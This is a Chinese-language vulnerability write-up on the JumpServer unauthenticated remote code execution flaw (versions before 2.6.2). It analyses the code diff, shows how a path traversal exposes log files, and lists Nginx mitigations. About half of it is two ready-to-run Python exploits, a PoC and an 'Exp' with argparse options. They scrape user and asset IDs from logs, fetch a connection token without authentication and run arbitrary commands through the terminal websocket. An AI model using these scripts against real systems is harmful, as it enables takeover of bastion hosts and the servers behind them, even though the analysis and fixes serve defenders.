## 简介

JumpServer 是全球首款开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 规范的运维安全审计系统。JumpServer 使用
Python / Django 为主进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal
方案，交互界面美观、用户体验好。JumpServer 采纳分布式架构，支持多机房跨区域部署，支持横向扩展，无资产数量及并发限制。

## 漏洞原理

由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求从日志文件获取敏感信息，或者执行相关API操作控制其中所有机器，执行任意命令。

## 影响版本

  * JumpServer < v2.6.2

  * JumpServer < v2.5.4

  * JumpServer < v2.4.5

  * JumpServer = v1.5.9

## 漏洞分析

根据官方通告，以下两个接口受得影响：

  1. /api/v1/authentication/connection-token/
  2. /api/v1/users/connection-token/

创建两个目录，jumpserver1和jumpserver2，分别将jumpserver v2.6.1和jumpserver
v2.6.2的源码下载下来，如图：

![](https://image.3001.net/images/20210124/1611463247_600cfa4fa3cd8ace1114f.png!small)

然后分别解压。接着比较两个版本代码部分的变动，即apps目录下的文件，使用命令git diff
jumpserver1/jumpserver-2.6.1/apps/ jumpserver2/jumpserver-2.6.2/apps/，如图：

![](https://image.3001.net/images/20210124/1611463274_600cfa6acc4c8e29e34c2.png!small)

在2.6.2版本auth.py中删除了get_permissions函数，在ws.py中connect函数增加了授权判断。从红色部分源代码中可看出，在有user-only参数值的情况下，会有AllowAny权限。从蓝色部分源代码中可看出来2.6.1版本中是不存在权限判断的。查看auth.py完整代码，如图：

![](https://image.3001.net/images/20210124/1611463325_600cfa9d1ee64dfb31401.png!small)

get_permissions函数为UserConnectionTokenApi类的成员函数。正确POST提交user，asset和system_user参数的值后会返回一个token。正确GET提交token并且包含user-only参数的情况下会返回用户信息。查看ws.py完整源代码，如图：

![](https://image.3001.net/images/20210124/1611463342_600cfaaec69251a3f48d7.png!small)

connect函数没有权限判断，因此只要建立连接就可访问所有内容。receive函数通过task参数获取task_id，wait_util_log_path_exist函数通过get_celery_task_log_path函数获得日志文件路径，然后返回文件对象。通过read_log_file函数即可读取日志内容。定位到get_celery_task_log_path函数发现路径拼接方法：settings.CELERY_LOG_DIR/task_id[0]/task_id[1]/task_id.log，且会递归创建该目录，如图：

![](https://image.3001.net/images/20210124/1611463359_600cfabf1fb00fcc3fcfb.png!small)

上述过程并未对task_id做过滤、转移等处理，因此存在路径穿越漏洞，利用该漏洞配合日志读取函数可读取所有.log文件。定位settings.CELERY_LOG_DIR如下：

![](https://image.3001.net/images/20210124/1611463373_600cfacdbd5383f133977.png!small)

因此可以先从log文件中读取出user、asset、system_user三个参数，然后使用apps/authentication/api/auth.py未授权获得API
token，最终通过API执行任意代码。

## 漏洞利用

在jumpserver/core:v2.6.1
Docker容器中/opt/jumpserver/logs/gunicorn.log文件中可找到user、asset、system_user三个参数的值，如图：

![](https://image.3001.net/images/20210124/1611463225_600cfa392566593d6c95e.png!small)

也可以使用火狐浏览器WebSocket插件通过ws://192.168.58.145:8080/ws/ops/tasks/log/连接websocket服务，然后发送{"task":"/opt/jumpserver/logs/gunicorn"}获得，如图：

![](https://image.3001.net/images/20210124/1611463405_600cfaed264a41d76070e.png!small)

POST提交这三个参数，GET提交user-only=None即可获得token，如图：

![](https://image.3001.net/images/20210124/1611463427_600cfb032e35682493eb3.png!small)

然后利用该token建立websocket连接（该token有效期20s，因此必须在20s内建立连接），打开ws://192.168.58.145:8080/koko/ws/token/?target_id=xxx，然后依次发送红色Json数据即可执行命令，如图：

![](https://image.3001.net/images/20210124/1611463439_600cfb0fe8dd7a3fc775b.png!small)

修改Poc中的三个参数并测试，如图：

![](https://image.3001.net/images/20210124/1611463451_600cfb1bbecf00e2d4291.png!small)

直接使用Exp测试，如图：

![](https://image.3001.net/images/20210124/1611463461_600cfb25db32568218552.png!small)

## 修复方法

  1. 升级 JumpServer 至最新版本。

  2. 设置当前产品的控制台登录IP地址白名单限制。

  3. 修改Nginx配置文件，以屏蔽漏洞接口 ：

  * /api/v1/authentication/connection-token/

  * /api/v1/users/connection-token/

Nginx配置文件位置如下：

    
    
    社区老版本
    /etc/nginx/conf.d/jumpserver.conf
    # 企业老版本
    jumpserver-release/nginx/http_server.conf
    # 新版本在 
    jumpserver-release/compose/config_static/http_server.conf
    

Nginx配置文件实例为：

    
    
    ### 保证在 /api 之前 和 / 之前
    location /api/v1/authentication/connection-token/ {
       return 403;
    }
     
    location /api/v1/users/connection-token/ {
       return 403;
    }
    ### 新增以上这些
     
    location /api/ {
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass <http://core:8080>;
      }
     
    ...
    

修改配置文件完毕后，重启Nginx服务即可。

## Poc

来自[jumpserver最新RCE复现——塔王](https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw)：

    
    
    # -*- coding: utf-8 -*-    # import requests
    # import json
    # data={"user":"4320ce47-e0e0-4b86-adb1-675ca611ea0c","asset":"ccb9c6d7-6221-445e-9fcc-b30c95162825","system_user":"79655e4e-1741-46af-a793-fff394540a52"}
    #
    # url_host='http://192.168.1.73:8080'
    #
    # def get_token():
    #     url = url_host+'/api/v1/users/connection-token/?user-only=1'
    #     url =url_host+'/api/v1/authentication/connection-token/?user-only=1'
    #     response = requests.post(url, json=data).json()
    #     print(response)
    #     ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])
    #     print(ret.text)
    # get_token()
    import asyncio
    import websockets
    import requests
    import json
    url = "/api/v1/authentication/connection-token/?user-only=None"
    
    # 向服务器端发送认证后的消息
    async def send_msg(websocket,_text):
        if _text == "exit":
            print(f'you have enter "exit", goodbye')
            await websocket.close(reason="user exit")
            return False
        await websocket.send(_text)
        recv_text = await websocket.recv()
        print(f"{recv_text}")
    
    # 客户端主逻辑
    async def main_logic(cmd):
        print("[*] 连接WebSocket服务器......")
        async with websockets.connect(target) as websocket:
            recv_text = await websocket.recv()
            #输出返回值
            #print(f"{recv_text}")
            resws=json.loads(recv_text)
            id = resws['id']
            print("[+] 获得id: "+id)
            print("[*] 初始化终端......")
            inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
            await send_msg(websocket,inittext)
            for i in range(100):
                recv_text = await websocket.recv()
                #print(f"{recv_text}")
            print("[*] 执行命令: "+cmd)
            cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
            #print(cmdtext)
            await send_msg(websocket, cmdtext)
            for i in range(100):
                recv_text = await websocket.recv()
                print(f"{recv_text}")
    
    
    if __name__ == '__main__':
        try:
            import sys
            host=sys.argv[1]
            cmd=sys.argv[2]
            if host[-1]=='/':
                host=host[:-1]
            #print(host)
            data = {"user": "4da648a2-1c65-42d9-a73f-06278d9455f2", "asset": "be50f1ff-a58d-4049-a2d3-5ac462549c1f","system_user": "bf23ea7f-bc15-4cdb-b6ba-ce022fce67a6"} #{"user": "4da648a2-1c65-42d9-a73f-06278d9455f2", "asset": "be50f1ff-a58d-4049-a2d3-5ac462549c1f","system_user": "bf23ea7f-bc15-4cdb-b6ba-ce022fce67a6"}
            #print("get token url:%s" % (host + url,))
            res = requests.post(host + url, json=data)
            token = res.json()["token"]
            print("[+] 获得token:",token)
            target = "ws://" + host.replace("http://", '') + "/koko/ws/token/?target_id=" + token
            #print("target ws:%s" % (target,))
            asyncio.get_event_loop().run_until_complete(main_logic(cmd))
        except:
            print("Usage: python3 "+sys.argv[0]+" [Target URL] [Command]\r\nExample: python3 "+sys.argv[0]+" http://192.168.1.73:8080 whoami")

## Exp

在大佬的基础上简单修改而得：

    
    
    #!/usr/bin/python3
    # -*- coding: utf-8 -*-    import asyncio
    import websockets
    import requests
    import json
    import re
    import sys
    import argparse
    
    path = "/api/v1/authentication/connection-token/?user-only=None"
    
    # 向服务器端发送认证后的消息
    async def send_msg(websocket,_text):
        if _text == "exit":
            #print(f'you have enter "exit", goodbye')
            await websocket.close(reason="user exit")
            return False
        await websocket.send(_text)
        recv_text = await websocket.recv()
        #print(f"{recv_text}")
    
    # 客户端主逻辑
    async def main_logic(url,cmd):
        print("[*] 连接WebSocket服务器......")
        target = "ws://"+url.replace("http://",'')+"/ws/ops/tasks/log/"
        async with websockets.connect(target) as websocket:
            # 获取三个参数值
            await send_msg(websocket,json.dumps({"task":"/opt/jumpserver/logs/gunicorn"}))
            for i in range(100):
                recv_text = await websocket.recv()
                three_pram=re.findall(r"asset_id=[a-z0-9\-]*[a-z\_=0-9\-&]*",recv_text)
                
                if three_pram:
                    break
            #print(three_pram)
            for i in range(len(three_pram)):
                three_pram[i]={"asset":re.findall(r"asset_id=[a-z0-9\-]*",three_pram[i])[0][9:],"system_user":re.findall(r"system_user_id=[a-z0-9\-]*",three_pram[i])[0][15:],"user":re.findall(r"&user_id=[a-z0-9\-]*",three_pram[i])[0][9:]}
            print("[+] 获取到三个参数值：",three_pram)
            #取列表第一个元素
            res = requests.post(url + path, data=three_pram[0])
            token = res.json()["token"]
            print("[+] 获得token:",token)
            await send_msg(websocket,"exit")
        target2 = "ws://" + url.replace("http://", '') + "/koko/ws/token/?target_id=" + token
        async with websockets.connect(target2) as websocket2:
            recv_text = await websocket2.recv()
            # 获取id
            resws=json.loads(recv_text)
            id = resws['id']
            print("[+] 获得id: "+id)
            print("[*] 初始化终端......")
            inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
            await send_msg(websocket2,inittext)
            recv_text = await websocket2.recv()
            # 执行命令
            print("[+] 执行命令: "+cmd)
            cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
            await send_msg(websocket2, cmdtext)
            print("[+] 执行结果：")
            # 接收10次数据
            for i in range(10):
                recv_text = await websocket2.recv()
                #print(i,recv_text)
                result=json.loads(recv_text)
                print(result["data"])
            await send_msg(websocket2,"exit")
    
    # 漏洞检测
    async def check_vuln(url):
        target = "ws://"+url.replace("http://",'')+"/ws/ops/tasks/log/"
        print("[*] Check：",url)
        try:
            async with websockets.connect(target) as websocket:
            
            # 获取三个参数值
                await send_msg(websocket,json.dumps({"task":"/opt/jumpserver/logs/gunicorn"}))
                for i in range(100):
                    recv_text = await websocket.recv()
                    three_pram=re.findall(r"asset_id=[a-z0-9\-]*[a-z\_=0-9\-&]*",recv_text)
                    if three_pram:
                        break
                await send_msg(websocket,"exit")
                print("[Vulnerable]",url)
        except:
            pass
    
    parser=argparse.ArgumentParser(description="JumpServer RCE Exploit Script!    --By Infiltrator",epilog="Example: python3 JumpServer_Exp.py -u http://192.168.1.73:8080 -e whoami")
    group = parser.add_mutually_exclusive_group(required=True)
    group2 = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u','--url',help="目标url地址")
    group.add_argument('-f','--file',type=argparse.FileType('r',encoding='utf8'),help="目标url文件")
    group2.add_argument('-c','--check',action='store_true',help="只检查不执行命令")
    group2.add_argument('-e','--execute',help="需要执行的命令")
    args = parser.parse_args()
    
    if args.url and args.check:
        asyncio.get_event_loop().run_until_complete(check_vuln(args.url))
    if args.file and args.check:
        fl=args.file.read().split('\n')
        for i in fl:
            asyncio.get_event_loop().run_until_complete(check_vuln(i))
    if args.url and args.execute:
        asyncio.get_event_loop().run_until_complete(main_logic(args.url,args.execute))
    if args.file and args.execute:
        print("[!] 该功能暂未实现！")

## 参考文章

[JumperServer 2021.1.15
RCE漏洞链分析及复现——懂安全的大蝉](https://articles.zsxq.com/id_greaukj7ex2n.html)

[jumpserver最新RCE复现——塔王](https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw)

